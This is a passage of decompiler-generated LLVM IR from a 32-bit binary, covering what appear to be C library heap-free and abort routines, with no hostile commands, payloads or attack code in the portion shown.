  %v3_8052ba0 = inttoptr i32 %v2_8052ba0 to i32*
  store i32 %v4_8052b9b, i32* %v3_8052ba0, align 4
  %v0_8052ba3 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052ba3 = add i32 %v0_8052ba3, 8
  %v3_8052ba3 = inttoptr i32 %v2_8052ba3 to i32*
  store i32 %v0_8052ba3, i32* %v3_8052ba3, align 4
  %v0_8052ba6 = load i32, i32* %edx.global-to-local, align 4
  %v7_8052ba9 = icmp sgt i32 %v0_8052ba6, 95
  br i1 %v7_8052ba9, label %dec_label_pc_8052bab, label %dec_label_pc_8052b97

dec_label_pc_8052bab:                             ; preds = %dec_label_pc_8052b97
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  %v1_8052baf = add i32 %tmp20, 864
  %v2_8052baf = inttoptr i32 %v1_8052baf to i32*
  %v3_8052baf = load i32, i32* %v2_8052baf, align 4
  %v4_8052baf = or i32 %v3_8052baf, 1
  store i32 %v4_8052baf, i32* %v2_8052baf, align 4
  %v0_8052bb6 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052bb6 = add i32 %v0_8052bb6, 840
  %v2_8052bb6 = inttoptr i32 %v1_8052bb6 to i32*
  store i32 0, i32* %v2_8052bb6, align 4
  %v0_8052bc0 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052bc0 = add i32 %v0_8052bc0, 852
  %v2_8052bc0 = inttoptr i32 %v1_8052bc0 to i32*
  store i32 65536, i32* %v2_8052bc0, align 4
  %v0_8052bca = load i32, i32* %eax.global-to-local, align 4
  %v1_8052bca = add i32 %v0_8052bca, 844
  %v2_8052bca = inttoptr i32 %v1_8052bca to i32*
  store i32 262144, i32* %v2_8052bca, align 4
  %v0_8052bd4 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052bd4 = add i32 %v0_8052bd4, 836
  %v2_8052bd4 = inttoptr i32 %v1_8052bd4 to i32*
  store i32 262144, i32* %v2_8052bd4, align 4
  store i32 %tmp20, i32* @edx, align 4
  %v2_8052be5 = load i32, i32* %arg1, align 4
  %v1_8052be7 = urem i32 %v2_8052be5, 4
  %v1_8052bea = or i32 %v1_8052be7, 72
  store i32 %v1_8052bea, i32* %arg1, align 4
  %v0_8052bef = load i32, i32* @edx, align 4
  %v1_8052bf1 = add i32 %v0_8052bef, 52
  store i32 %v1_8052bf1, i32* %eax.global-to-local, align 4
  %v2_8052bf4 = add i32 %v0_8052bef, 44
  %v3_8052bf4 = inttoptr i32 %v2_8052bf4 to i32*
  store i32 %v1_8052bf1, i32* %v3_8052bf4, align 4
  %v1_8052bf9 = call i32 @function_80531f3(i32 30)
  store i32 %v1_8052bf9, i32* %eax.global-to-local, align 4
  %v2_8052c05 = add i32 %tmp20, 860
  %v3_8052c05 = inttoptr i32 %v2_8052c05 to i32*
  store i32 %v1_8052bf9, i32* %v3_8052c05, align 4
  br label %dec_label_pc_8052c0b

dec_label_pc_8052c0b:                             ; preds = %dec_label_pc_8052b83, %dec_label_pc_8052bab
  store i32 %v0_8052a6e, i32* @ebx, align 4
  store i32 %v0_8052a6d, i32* @esi, align 4
  store i32 %v0_8052a6c, i32* @edi, align 4
  %v0_8052c12 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8052c12

; uselistorder directives
  uselistorder i32 %v0_8052ba6, { 1, 0 }
  uselistorder i32 %v0_8052ba3, { 1, 0 }
  uselistorder i32 %v1_8052b9b, { 1, 0 }
  uselistorder i32 %v0_8052b62, { 1, 0 }
  uselistorder i32 %v1_8052b1d, { 1, 0 }
  uselistorder i32 %v2_8052b16, { 1, 0 }
  uselistorder i32 %v1_8052b0e, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8052b1a, { 1, 0 }
  uselistorder i32 %v3_8052ac9, { 2, 1, 3, 0 }
  uselistorder i32 %v0_8052ae6, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8052ac3, { 1, 0, 3, 2 }
  uselistorder i32* %v3_8052b74, { 1, 0 }
  uselistorder i32 %v1_8052a8e, { 1, 0 }
  uselistorder i32 %tmp20, { 3, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 25, 26, 27, 28 }
  uselistorder i32 860, { 1, 0 }
  uselistorder i32 -3, { 1, 0 }
  uselistorder label %dec_label_pc_8052c0b, { 1, 0 }
  uselistorder label %dec_label_pc_8052b97, { 1, 0 }
  uselistorder label %dec_label_pc_8052b77, { 1, 0 }
  uselistorder label %dec_label_pc_8052b43, { 1, 0 }
  uselistorder label %dec_label_pc_8052b3b, { 1, 0 }
  uselistorder label %dec_label_pc_8052b06, { 1, 0 }
}

define i32 @function_8052c13(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052c13:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8052c13 = load i32, i32* @ebp, align 4
  %v0_8052c14 = load i32, i32* @edi, align 4
  %v0_8052c15 = load i32, i32* @esi, align 4
  %v0_8052c16 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8052c1e = icmp eq i32 %arg1, 0
  br i1 %v1_8052c1e, label %dec_label_pc_8052da7, label %dec_label_pc_8052c26

dec_label_pc_8052c26:                             ; preds = %dec_label_pc_8052c13
  %v2_8052c31 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8052c31, i32* @eax, align 4
  %v2_8052c36 = call i32 @function_805337a(i32 %v2_8052c31, i32 134558583)
  store i32 %v2_8052c36, i32* %eax.global-to-local, align 4
  %v1_8052c42 = call i32 @function_8053377(i32 ptrtoint (i32* @global_var_80555dc.32 to i32))
  %v1_8052c47 = add i32 %arg1, -8
  store i32 %v1_8052c47, i32* @ecx, align 4
  %v0_8052c4a = load i8, i8* @global_var_80558c0.33, align 1
  %v1_8052c4a = sext i8 %v0_8052c4a to i32
  store i32 %v1_8052c4a, i32* %eax.global-to-local, align 4
  %v1_8052c52 = add i32 %arg1, -4
  %v2_8052c52 = inttoptr i32 %v1_8052c52 to i32*
  %v3_8052c52 = load i32, i32* %v2_8052c52, align 4
  %v1_8052c57 = and i32 %v3_8052c52, -4
  %v4_8052c57 = trunc i32 %v1_8052c57 to i8
  store i32 %v1_8052c57, i32* @ebx, align 4
  %v8_8052c5c = icmp ugt i8 %v4_8052c57, %v0_8052c4a
  br i1 %v8_8052c5c, label %dec_label_pc_8052c7e, label %dec_label_pc_8052c5e

dec_label_pc_8052c5e:                             ; preds = %dec_label_pc_8052c26
  %v2_8052c5e = udiv i32 %v3_8052c52, 8
  %v1_8052c61 = or i32 %v1_8052c4a, 3
  %v3_8052c61 = trunc i32 %v1_8052c61 to i8
  store i32 %v1_8052c61, i32* %eax.global-to-local, align 4
  store i8 %v3_8052c61, i8* @global_var_80558c0.33, align 64
  %v1_8052c69 = mul nuw i32 %v2_8052c5e, 4
  %v2_8052c69 = add i32 %v1_8052c69, ptrtoint (i8* @global_var_80558c0.33 to i32)
  store i32 %v2_8052c69, i32* @edx, align 4
  %v1_8052c70 = add i32 %v1_8052c69, add (i32 ptrtoint (i8* @global_var_80558c0.33 to i32), i32 -4)
  %v2_8052c70 = inttoptr i32 %v1_8052c70 to i32*
  %v3_8052c70 = load i32, i32* %v2_8052c70, align 4
  store i32 %v3_8052c70, i32* %eax.global-to-local, align 4
  %v3_8052c73 = inttoptr i32 %arg1 to i32*
  store i32 %v3_8052c70, i32* %v3_8052c73, align 4
  %v0_8052c76 = load i32, i32* @ecx, align 4
  %v1_8052c76 = load i32, i32* @edx, align 4
  %v2_8052c76 = add i32 %v1_8052c76, -4
  %v3_8052c76 = inttoptr i32 %v2_8052c76 to i32*
  store i32 %v0_8052c76, i32* %v3_8052c76, align 4
  br label %dec_label_pc_8052d96

dec_label_pc_8052c7e:                             ; preds = %dec_label_pc_8052c26
  %v1_8052c7e = trunc i32 %v3_8052c52 to i8
  %v2_8052c7e = and i8 %v1_8052c7e, 2
  %v3_8052c7e = icmp eq i8 %v2_8052c7e, 0
  %v5_8052c7e = zext i8 %v2_8052c7e to i32
  %v7_8052c7e = and i32 %v3_8052c52, -256
  %v8_8052c7e = or i32 %v5_8052c7e, %v7_8052c7e
  store i32 %v8_8052c7e, i32* @edx, align 4
  %v1_8052c81 = icmp eq i1 %v3_8052c7e, false
  br i1 %v1_8052c81, label %dec_label_pc_8052d76, label %dec_label_pc_8052c87

dec_label_pc_8052c87:                             ; preds = %dec_label_pc_8052c7e
  %v1_8052c87 = or i32 %v1_8052c4a, 1
  %v3_8052c87 = trunc i32 %v1_8052c87 to i8
  store i32 %v1_8052c87, i32* %eax.global-to-local, align 4
  %v2_8052c8a = add i32 %v1_8052c57, %v1_8052c47
  store i32 %v2_8052c8a, i32* @esi, align 4
  store i8 %v3_8052c87, i8* @global_var_80558c0.33, align 64
  %v1_8052c92 = add i32 %v2_8052c8a, 4
  %v2_8052c92 = inttoptr i32 %v1_8052c92 to i32*
  %v3_8052c92 = load i32, i32* %v2_8052c92, align 4
  store i32 %v3_8052c92, i32* %eax.global-to-local, align 4
  %v2_8052c99 = inttoptr i32 %v1_8052c52 to i8*
  %v3_8052c99 = load i8, i8* %v2_8052c99, align 1
  %v4_8052c99 = urem i8 %v3_8052c99, 2
  %v5_8052c99 = icmp eq i8 %v4_8052c99, 0
  %v1_8052c9d = icmp eq i1 %v5_8052c99, false
  br i1 %v1_8052c9d, label %dec_label_pc_8052cc0, label %dec_label_pc_8052c9f

dec_label_pc_8052c9f:                             ; preds = %dec_label_pc_8052c87
  %v2_8052c9f = inttoptr i32 %v1_8052c47 to i32*
  %v3_8052c9f = load i32, i32* %v2_8052c9f, align 4
  store i32 %v3_8052c9f, i32* @ebp, align 4
  %v2_8052ca4 = sub i32 %v1_8052c47, %v3_8052c9f
  store i32 %v2_8052ca4, i32* %eax.global-to-local, align 4
  %v1_8052ca6 = add i32 %v2_8052ca4, 8
  %v2_8052ca6 = inttoptr i32 %v1_8052ca6 to i32*
  %v3_8052ca6 = load i32, i32* %v2_8052ca6, align 4
  store i32 %v3_8052ca6, i32* @edi, align 4
  %v1_8052ca9 = add i32 %v2_8052ca4, 12
  %v2_8052ca9 = inttoptr i32 %v1_8052ca9 to i32*
  %v3_8052ca9 = load i32, i32* %v2_8052ca9, align 4
  store i32 %v3_8052ca9, i32* @edx, align 4
  %v1_8052cac = add i32 %v3_8052ca6, 12
  %v2_8052cac = inttoptr i32 %v1_8052cac to i32*
  %v3_8052cac = load i32, i32* %v2_8052cac, align 4
  store i32 %v3_8052cac, i32* @ecx, align 4
  %v12_8052caf = icmp eq i32 %v3_8052cac, %v2_8052ca4
  %v1_8052cb1 = icmp eq i1 %v12_8052caf, false
  br i1 %v1_8052cb1, label %dec_label_pc_8052cef, label %dec_label_pc_8052cb3

dec_label_pc_8052cb3:                             ; preds = %dec_label_pc_8052c9f
  %v1_8052cb3 = add i32 %v3_8052ca9, 8
  %v2_8052cb3 = inttoptr i32 %v1_8052cb3 to i32*
  %v3_8052cb3 = load i32, i32* %v2_8052cb3, align 4
  %v15_8052cb3 = icmp eq i32 %v3_8052cb3, %v3_8052cac
  %v1_8052cb6 = icmp eq i1 %v15_8052cb3, false
  br i1 %v1_8052cb6, label %dec_label_pc_8052cef, label %dec_label_pc_8052cb8

dec_label_pc_8052cb8:                             ; preds = %dec_label_pc_8052cb3
  %v2_8052cb8 = add i32 %v3_8052c9f, %v1_8052c57
  store i32 %v2_8052cb8, i32* @ebx, align 4
  store i32 %v3_8052ca9, i32* %v2_8052cac, align 4
  %v0_8052cbd = load i32, i32* @edi, align 4
  %v1_8052cbd = load i32, i32* @edx, align 4
  %v2_8052cbd = add i32 %v1_8052cbd, 8
  %v3_8052cbd = inttoptr i32 %v2_8052cbd to i32*
  store i32 %v0_8052cbd, i32* %v3_8052cbd, align 4
  %v0_8052cc7.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052cc0

dec_label_pc_8052cc0:                             ; preds = %dec_label_pc_8052c87, %dec_label_pc_8052cb8
  %v1_8052cd3 = phi i32 [ %v2_8052c8a, %dec_label_pc_8052c87 ], [ %v0_8052cc7.pre, %dec_label_pc_8052cb8 ]
  %v1_8052cc4 = and i32 %v3_8052c92, -4
  store i32 %v1_8052cc4, i32* @ebp, align 4
  %v1_8052cc7 = load i32, i32* @global_var_80558ec.34, align 4
  %v12_8052cc7 = icmp eq i32 %v1_8052cd3, %v1_8052cc7
  br i1 %v12_8052cc7, label %dec_label_pc_8052d21, label %dec_label_pc_8052ccf

dec_label_pc_8052ccf:                             ; preds = %dec_label_pc_8052cc0
  %v2_8052ccf = add i32 %v1_8052cd3, 4
  %v3_8052ccf = add i32 %v2_8052ccf, %v1_8052cc4
  %v4_8052ccf = inttoptr i32 %v3_8052ccf to i32*
  %v5_8052ccf = load i32, i32* %v4_8052ccf, align 4
  store i32 %v5_8052ccf, i32* %eax.global-to-local, align 4
  %v3_8052cd3 = inttoptr i32 %v2_8052ccf to i32*
  store i32 %v1_8052cc4, i32* %v3_8052cd3, align 4
  %v0_8052cd6 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052cd6 = urem i32 %v0_8052cd6, 2
  %v2_8052cd6 = icmp eq i32 %v1_8052cd6, 0
  store i32 %v1_8052cd6, i32* %eax.global-to-local, align 4
  %v1_8052cdb = icmp eq i1 %v2_8052cd6, false
  br i1 %v1_8052cdb, label %dec_label_pc_8052cfc, label %dec_label_pc_8052cdd

dec_label_pc_8052cdd:                             ; preds = %dec_label_pc_8052ccf
  %v0_8052cdd = load i32, i32* @esi, align 4
  %v1_8052cdd = add i32 %v0_8052cdd, 8
  %v2_8052cdd = inttoptr i32 %v1_8052cdd to i32*
  %v3_8052cdd = load i32, i32* %v2_8052cdd, align 4
  store i32 %v3_8052cdd, i32* @edx, align 4
  %v1_8052ce0 = add i32 %v0_8052cdd, 12
  %v2_8052ce0 = inttoptr i32 %v1_8052ce0 to i32*
  %v3_8052ce0 = load i32, i32* %v2_8052ce0, align 4
  store i32 %v3_8052ce0, i32* %eax.global-to-local, align 4
  %v1_8052ce3 = add i32 %v3_8052cdd, 12
  %v2_8052ce3 = inttoptr i32 %v1_8052ce3 to i32*
  %v3_8052ce3 = load i32, i32* %v2_8052ce3, align 4
  store i32 %v3_8052ce3, i32* @edi, align 4
  %v12_8052ce6 = icmp eq i32 %v3_8052ce3, %v0_8052cdd
  %v1_8052ce8 = icmp eq i1 %v12_8052ce6, false
  br i1 %v1_8052ce8, label %dec_label_pc_8052cef, label %dec_label_pc_8052cea

dec_label_pc_8052cea:                             ; preds = %dec_label_pc_8052cdd
  %v1_8052cea = add i32 %v3_8052ce0, 8
  %v2_8052cea = inttoptr i32 %v1_8052cea to i32*
  %v3_8052cea = load i32, i32* %v2_8052cea, align 4
  %v15_8052cea = icmp eq i32 %v3_8052cea, %v3_8052ce3
  br i1 %v15_8052cea, label %dec_label_pc_8052cf4, label %dec_label_pc_8052cef

dec_label_pc_8052cef:                             ; preds = %dec_label_pc_8052cea, %dec_label_pc_8052cdd, %dec_label_pc_8052cb3, %dec_label_pc_8052c9f
  %v0_8052cef = call i32 @function_8052daf()
  store i32 %v0_8052cef, i32* %eax.global-to-local, align 4
  %v1_8052cf4.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052cf4

dec_label_pc_8052cf4:                             ; preds = %dec_label_pc_8052cea, %dec_label_pc_8052cef
  %v1_8052cf4 = phi i32 [ %v3_8052cdd, %dec_label_pc_8052cea ], [ %v1_8052cf4.pre, %dec_label_pc_8052cef ]
  %v0_8052cf4 = phi i32 [ %v3_8052ce0, %dec_label_pc_8052cea ], [ %v0_8052cef, %dec_label_pc_8052cef ]
  %v2_8052cf4 = add i32 %v1_8052cf4, 12
  %v3_8052cf4 = inttoptr i32 %v2_8052cf4 to i32*
  store i32 %v0_8052cf4, i32* %v3_8052cf4, align 4
  %v0_8052cf7 = load i32, i32* @edx, align 4
  %v1_8052cf7 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052cf7 = add i32 %v1_8052cf7, 8
  %v3_8052cf7 = inttoptr i32 %v2_8052cf7 to i32*
  store i32 %v0_8052cf7, i32* %v3_8052cf7, align 4
  %v0_8052cfa = load i32, i32* @ebx, align 4
  %v1_8052cfa = load i32, i32* @ebp, align 4
  %v2_8052cfa = add i32 %v1_8052cfa, %v0_8052cfa
  store i32 %v2_8052cfa, i32* @ebx, align 4
  br label %dec_label_pc_8052cfc

dec_label_pc_8052cfc:                             ; preds = %dec_label_pc_8052ccf, %dec_label_pc_8052cf4
  %v0_8052cfc = load i32, i32* @global_var_80558fc.52, align 4
  store i32 %v0_8052cfc, i32* %eax.global-to-local, align 4
  %v0_8052d01 = load i32, i32* @ecx, align 4
  %v1_8052d01 = add i32 %v0_8052d01, 12
  %v2_8052d01 = inttoptr i32 %v1_8052d01 to i32*
  store i32 ptrtoint (i32* @global_var_80558f4.36 to i32), i32* %v2_8052d01, align 4
  %v0_8052d08 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052d08 = load i32, i32* @ecx, align 4
  %v2_8052d08 = add i32 %v1_8052d08, 8
  %v3_8052d08 = inttoptr i32 %v2_8052d08 to i32*
  store i32 %v0_8052d08, i32* %v3_8052d08, align 4
  %v0_8052d0b = load i32, i32* @ebx, align 4
  %v1_8052d0b = load i32, i32* @ecx, align 4
  %v3_8052d0b = add i32 %v1_8052d0b, %v0_8052d0b
  %v4_8052d0b = inttoptr i32 %v3_8052d0b to i32*
  store i32 %v0_8052d0b, i32* %v4_8052d0b, align 4
  %v0_8052d0e = load i32, i32* @ecx, align 4
  %v1_8052d0e = load i32, i32* %eax.global-to-local, align 4
  %v2_8052d0e = add i32 %v1_8052d0e, 12
  %v3_8052d0e = inttoptr i32 %v2_8052d0e to i32*
  store i32 %v0_8052d0e, i32* %v3_8052d0e, align 4
  %v0_8052d11 = load i32, i32* @ebx, align 4
  %v1_8052d13 = or i32 %v0_8052d11, 1
  store i32 %v1_8052d13, i32* %eax.global-to-local, align 4
  %v0_8052d16 = load i32, i32* @ecx, align 4
  store i32 %v0_8052d16, i32* @global_var_80558fc.52, align 4
  %v2_8052d1c = add i32 %v0_8052d16, 4
  %v3_8052d1c = inttoptr i32 %v2_8052d1c to i32*
  store i32 %v1_8052d13, i32* %v3_8052d1c, align 4
  br label %dec_label_pc_8052d31

dec_label_pc_8052d21:                             ; preds = %dec_label_pc_8052cc0
  %v0_8052d21 = load i32, i32* @ebx, align 4
  %v2_8052d21 = add i32 %v0_8052d21, %v1_8052cc4
  store i32 %v2_8052d21, i32* @ebx, align 4
  %v1_8052d25 = or i32 %v2_8052d21, 1
  store i32 %v1_8052d25, i32* %eax.global-to-local, align 4
  %v1_8052d28 = load i32, i32* @ecx, align 4
  %v2_8052d28 = add i32 %v1_8052d28, 4
  %v3_8052d28 = inttoptr i32 %v2_8052d28 to i32*
  store i32 %v1_8052d25, i32* %v3_8052d28, align 4
  %v0_8052d2b = load i32, i32* @ecx, align 4
  store i32 %v0_8052d2b, i32* @global_var_80558ec.34, align 4
  br label %dec_label_pc_8052d31

dec_label_pc_8052d31:                             ; preds = %dec_label_pc_8052cfc, %dec_label_pc_8052d21
  %v0_8052d31 = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_8052d31, 131072
  br i1 %tmp21, label %dec_label_pc_8052d96, label %dec_label_pc_8052d39

dec_label_pc_8052d39:                             ; preds = %dec_label_pc_8052d31
  %v0_8052d39 = load i8, i8* @global_var_80558c0.33, align 64
  %v1_8052d39 = and i8 %v0_8052d39, 2
  %v2_8052d39 = icmp eq i8 %v1_8052d39, 0
  br i1 %v2_8052d39, label %dec_label_pc_8052d52, label %dec_label_pc_8052d42

dec_label_pc_8052d42:                             ; preds = %dec_label_pc_8052d39
  %v2_8052d4a = call i32 @function_8052a6b(i32* bitcast (i8* @global_var_80558c0.33 to i32*))
  store i32 %v2_8052d4a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d52

dec_label_pc_8052d52:                             ; preds = %dec_label_pc_8052d39, %dec_label_pc_8052d42
  %v0_8052d52 = load i32, i32* @global_var_80558ec.34, align 4
  store i32 %v0_8052d52, i32* %eax.global-to-local, align 4
  %v1_8052d57 = add i32 %v0_8052d52, 4
  %v2_8052d57 = inttoptr i32 %v1_8052d57 to i32*
  %v3_8052d57 = load i32, i32* %v2_8052d57, align 4
  %v1_8052d5a = and i32 %v3_8052d57, -4
  store i32 %v1_8052d5a, i32* %eax.global-to-local, align 4
  %v1_8052d5d = load i32, i32* @global_var_8055c04.50, align 4
  %v7_8052d5d = icmp ult i32 %v1_8052d5a, %v1_8052d5d
  br i1 %v7_8052d5d, label %dec_label_pc_8052d96, label %dec_label_pc_8052d65

dec_label_pc_8052d65:                             ; preds = %dec_label_pc_8052d52
  store i32 ptrtoint (i8* @global_var_80558c0.33 to i32), i32* @edx, align 4
  %v0_8052d6a = load i32, i32* @global_var_8055c08.48, align 8
  store i32 %v0_8052d6a, i32* @eax, align 4
  %v0_8052d6f = call i32 @function_80529de()
  store i32 %v0_8052d6f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d96

dec_label_pc_8052d76:                             ; preds = %dec_label_pc_8052c7e
  %v2_8052d76 = inttoptr i32 %v1_8052c47 to i32*
  %v3_8052d76 = load i32, i32* %v2_8052d76, align 4
  %v0_8052d79 = load i32, i32* @global_var_8055c10.41, align 16
  %v1_8052d79 = add i32 %v0_8052d79, -1
  store i32 %v1_8052d79, i32* @global_var_8055c10.41, align 16
  %v2_8052d7f = add i32 %v3_8052d76, %v1_8052c57
  store i32 %v2_8052d7f, i32* %eax.global-to-local, align 4
  %v2_8052d82 = sub i32 %v1_8052c47, %v3_8052d76
  %v0_8052d88 = load i32, i32* @global_var_8055c24.44, align 4
  %v2_8052d88 = sub i32 %v0_8052d88, %v2_8052d7f
  store i32 %v2_8052d88, i32* @global_var_8055c24.44, align 4
  %v4_8052d8e = inttoptr i32 %v2_8052d82 to i32*
  %v5_8052d8e = call i32 @function_8053add(i32* %v4_8052d8e, i32 %v2_8052d7f, i32 %v1_8052c57, i32 %v1_8052c57)
  store i32 %v5_8052d8e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d96

dec_label_pc_8052d96:                             ; preds = %dec_label_pc_8052d52, %dec_label_pc_8052d31, %dec_label_pc_8052d65, %dec_label_pc_8052c5e, %dec_label_pc_8052d76
  store i32 %v2_8052c31, i32* @eax, align 4
  %v2_8052d9f = call i32 @function_805337a(i32 %v2_8052c31, i32 1)
  store i32 %v2_8052d9f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052da7

dec_label_pc_8052da7:                             ; preds = %dec_label_pc_8052c13, %dec_label_pc_8052d96
  %.0 = phi i32 [ undef, %dec_label_pc_8052c13 ], [ %v2_8052d9f, %dec_label_pc_8052d96 ]
  store i32 %v0_8052c16, i32* @ebx, align 4
  store i32 %v0_8052c15, i32* @esi, align 4
  store i32 %v0_8052c14, i32* @edi, align 4
  store i32 %v0_8052c13, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_8052d76, { 1, 0 }
  uselistorder i32 %v0_8052d0b, { 1, 0 }
  uselistorder i32 %v1_8052cd6, { 1, 0 }
  uselistorder i32 %v2_8052ccf, { 1, 0 }
  uselistorder i32 %v1_8052cc4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8052cd3, { 1, 0 }
  uselistorder i32 %v1_8052c57, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_8052c52, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8052c47, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* bitcast (i8* @global_var_80558c0.33 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_80558f4.36 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_80558ec.34, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i8* @global_var_80558c0.33 to i32), { 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_80558c0.33, { 4, 7, 6, 5, 3, 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_80555dc.32 to i32), { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %arg1, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8052da7, { 1, 0 }
  uselistorder label %dec_label_pc_8052d96, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8052d52, { 1, 0 }
  uselistorder label %dec_label_pc_8052d31, { 1, 0 }
  uselistorder label %dec_label_pc_8052cfc, { 1, 0 }
  uselistorder label %dec_label_pc_8052cf4, { 1, 0 }
  uselistorder label %dec_label_pc_8052cc0, { 1, 0 }
}

define i32 @function_8052daf() local_unnamed_addr {
dec_label_pc_8052dca.lr.ph:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_8052dbb = call i32 @function_8053377(i32 ptrtoint (i32* @global_var_80555f4.53 to i32))
  %v12_8052dc5 = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_8052dca48 = add i32 %v12_8052dc5, 276
  %v5_8052dca49 = inttoptr i32 %v4_8052dca48 to i32*
  store i32 0, i32* %v5_8052dca49, align 4
  %v0_8052dd550 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052dd551 = add i32 %v0_8052dd550, -1
  %v9_8052dd552 = icmp slt i32 %v1_8052dd551, 0
  store i32 %v1_8052dd551, i32* %eax.global-to-local, align 4
  %v1_8052dd653 = icmp eq i1 %v9_8052dd552, false
  br i1 %v1_8052dd653, label %dec_label_pc_8052dca.dec_label_pc_8052dca_crit_edge, label %dec_label_pc_8052dd8

dec_label_pc_8052dca.dec_label_pc_8052dca_crit_edge: ; preds = %dec_label_pc_8052dca.lr.ph, %dec_label_pc_8052dca.dec_label_pc_8052dca_crit_edge
  %v1_8052dd554 = phi i32 [ %v1_8052dd5, %dec_label_pc_8052dca.dec_label_pc_8052dca_crit_edge ], [ %v1_8052dd551, %dec_label_pc_8052dca.lr.ph ]
  %v0_8052dca.pre = load i32, i32* @esp, align 4
  %v2_8052dca = mul i32 %v1_8052dd554, 4
  %v3_8052dca = add i32 %v0_8052dca.pre, 152
  %v4_8052dca = add i32 %v3_8052dca, %v2_8052dca
  %v5_8052dca = inttoptr i32 %v4_8052dca to i32*
  store i32 0, i32* %v5_8052dca, align 4
  %v0_8052dd5 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052dd5 = add i32 %v0_8052dd5, -1
  %v9_8052dd5 = icmp slt i32 %v1_8052dd5, 0
  store i32 %v1_8052dd5, i32* %eax.global-to-local, align 4
  %v1_8052dd6 = icmp eq i1 %v9_8052dd5, false
  br i1 %v1_8052dd6, label %dec_label_pc_8052dca.dec_label_pc_8052dca_crit_edge, label %dec_label_pc_8052dd8

dec_label_pc_8052dd8:                             ; preds = %dec_label_pc_8052dca.dec_label_pc_8052dca_crit_edge, %dec_label_pc_8052dca.lr.ph
  %v0_8052dd8 = load i32, i32* @ebx, align 4
  %v2_8052ddc = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8052ddc, i32* @ebx, align 4
  %v4_8052de4 = call i32 @function_8051e08(i32 %v2_8052ddc, i32 6, i32 %v0_8052dd8, i32 %v0_8052dd8)
  store i32 %v4_8052de4, i32* %eax.global-to-local, align 4
  %v1_8052dec = icmp eq i32 %v4_8052de4, 0
  %v1_8052dee = icmp eq i1 %v1_8052dec, false
  br i1 %v1_8052dee, label %dec_label_pc_8052dfe, label %dec_label_pc_8052df0

dec_label_pc_8052df0:                             ; preds = %dec_label_pc_8052dd8
  %v3_8052df6 = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_8052df6 = call i32 @function_805174f(i32 1, %_TYPEDEF_sigset_t* %v3_8052df6, i32 0)
  store i32 %v4_8052df6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052dfe

dec_label_pc_8052dfe:                             ; preds = %dec_label_pc_8052dd8, %dec_label_pc_8052df0
  %v2_8052e3623 = phi i32 [ %v4_8052de4, %dec_label_pc_8052dd8 ], [ %v4_8052df6, %dec_label_pc_8052df0 ]
  %v0_8052dfe = load i8, i8* @global_var_80556d4.54, align 4
  %v1_8052dfe = icmp eq i8 %v0_8052dfe, 0
  %v1_8052e05 = icmp eq i1 %v1_8052dfe, false
  br i1 %v1_8052e05, label %dec_label_pc_8052e36, label %dec_label_pc_8052e07

dec_label_pc_8052e07:                             ; preds = %dec_label_pc_8052dfe
  store i8 1, i8* @global_var_80556d4.54, align 4
  br label %dec_label_pc_8052e0e

dec_label_pc_8052e0e:                             ; preds = %dec_label_pc_8052e75, %dec_label_pc_8052e07
  %v1_8052e16 = call i32 @function_8053377(i32 ptrtoint (i32* @global_var_80555f4.53 to i32))
  store i32 %v1_8052e16, i32* %eax.global-to-local, align 4
  %v1_8052e22 = call i32 @function_8053cf5(i32 6)
  store i32 %v1_8052e22, i32* %eax.global-to-local, align 4
